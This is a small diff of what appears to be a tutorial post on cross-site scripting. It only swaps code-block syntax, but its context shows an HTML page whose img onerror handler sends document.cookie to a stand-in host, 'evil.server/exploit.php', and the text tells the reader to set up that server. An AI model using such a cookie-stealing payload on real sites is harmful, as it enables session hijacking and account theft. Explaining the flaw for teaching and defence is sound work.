@@ -17,7 +17,7 @@ Check out the code below:
 
 Source page without proper filtering:
 
-{% highlight HTML %}
+```html
 <html>
     <body>
         <h1>test</h1>
@@ -25,7 +25,7 @@ Source page without proper filtering:
         <img onerror="this.src='http://evil.server/exploit.php?'+document.cookie" src=""></img>
     </body>
 </html>
-{% endhighlight %}
+```
 
 Then, on evil.server, place your image.  Finally, top it off with the following code in exploit.php
 
